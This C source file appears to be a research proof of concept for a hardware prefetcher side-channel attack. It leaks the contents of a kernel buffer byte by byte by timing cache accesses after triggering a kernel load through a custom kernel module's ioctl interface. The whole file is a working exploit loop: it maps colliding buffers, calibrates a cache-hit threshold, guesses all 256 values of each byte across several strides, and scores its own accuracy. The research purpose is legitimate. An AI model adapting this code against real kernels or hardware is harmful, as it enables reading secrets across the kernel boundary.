#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <time.h>

#include "common.h"

#include "kernel_module/fetch_probe_module.h"

// file descriptor of kernel module
static int module_fd;

// colliding load instruction
static load_gadget_f gadget;

// colliding buffer
static uint8_t* colliding_buffer;

// threshold to distinguish cache hit from cache miss
static uint64_t threshold;

static uint64_t guess_byte(size_t STRIDE, size_t offset, size_t guess_offset) {

    // flush last accessed buffer location and probe location
    flush(colliding_buffer + 3 * STRIDE + guess_offset); 
    flush(colliding_buffer + 4 * STRIDE + guess_offset); 
    mfence();

    // access in kernel to rbp
    ioctl(module_fd, CMD_GADGET, offset);
    mfence();
   
    // more accesses in userspace.
    // if offset is guessed correctly, this follows the stride and will prefetch.
    // otherwise, this will not prefetch.
    gadget(colliding_buffer + 1 * STRIDE + guess_offset);
    mfence();
    gadget(colliding_buffer + 2 * STRIDE + guess_offset);
    mfence();
    gadget(colliding_buffer + 3 * STRIDE + guess_offset);
    mfence();
    
    // fast access time -> was prefetched -> accesses followed stride -> guess was correct
    return probe(colliding_buffer + 4 * STRIDE + guess_offset) < threshold;
}

static uint64_t get_time_nanos() {
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return t.tv_sec * 1000000000ull + t.tv_nsec;
}

int main(int argc, char** argv) {

    // open kernel module
    module_fd = open(FETCH_PROBE_MODULE_DEVICE_PATH, O_RDONLY);
    if(module_fd < 0) {
        fputs("failed to open kernel module!\n", stderr);
        return -1;
    }
    
    // get required addresses from kernel
    struct prefetchjection_kernel_info info;
    ioctl(module_fd, CMD_INFO, &info);
    printf("kernel buffer: 0x%016zx\nkernel load: 0x%016zx\n", info.kernel_buffer, info.kernel_access_off);
    
    // map colliding buffer
    gadget = map_gadget((info.kernel_access_off) & 0x7fffffffffffull);
    colliding_buffer = map_buffer(info.kernel_buffer & 0x7ffffffff000ull, 1 << 14) + (info.kernel_buffer & 0xc00);
    printf("colliding buffer: 0x%016zx\ncolliding load: 0x%016zx\n", (uintptr_t)colliding_buffer, (uintptr_t)gadget);
    
    // calculate threshold to distinguish cache hit from cache miss
    threshold = calculate_threshold();
    printf("threshold: %zu\n", threshold);
    
    // just use timestamp as initial seed
    uint64_t shared_seed = _rdtsc();
    
    // initialize kernel buffer with pseudo random data
    ioctl(module_fd, CMD_RESET, shared_seed);
   
    // leak whole buffer
    uint8_t leakage[BUFFER_SIZE] = {0};
    
    mfence();
    uint64_t start = get_time_nanos();
    mfence();
    
    // leak each byte of the secret buffer by guessing until the correct one is found
    for(size_t offset = 0; offset < BUFFER_SIZE; offset ++){
        for(uintptr_t guess = 0; guess < 256; guess ++) {
           gadget(&colliding_buffer[1337]);
           mfence();
           if(guess_byte(516, offset, guess << 2)){
                leakage[offset] = guess;
                goto next;
            }
        }
        
        // retry with different stride if no leakage
        for(uintptr_t guess = 0; guess < 256; guess ++) {
            gadget(&colliding_buffer[1337]);
            mfence();
            if(guess_byte(2048, offset, guess << 2)){
                leakage[offset] = guess;
                goto next;
            }
        }
        
        // retry one last time if no leakage
        for(uintptr_t guess = 0; guess < 256; guess ++) {
            gadget(&colliding_buffer[1337]);
            mfence();
            if(guess_byte(720, offset, guess << 2)){
                leakage[offset] = guess;
                goto next;
            }
        }
        
        // leaked a byte or given
        next:
    }
    mfence();
    uint64_t end = get_time_nanos();
    mfence();
    
    printf("time: %zu\n", end - start);
    
    // check how much of the leakage is correct
    seed = shared_seed;
    uint32_t correct = 0;
    for(int i = 0; i < BUFFER_SIZE; i++) {
        correct += (uint8_t)rand64() == leakage[i];
    }
    printf("correct: %u\n", correct);
}	
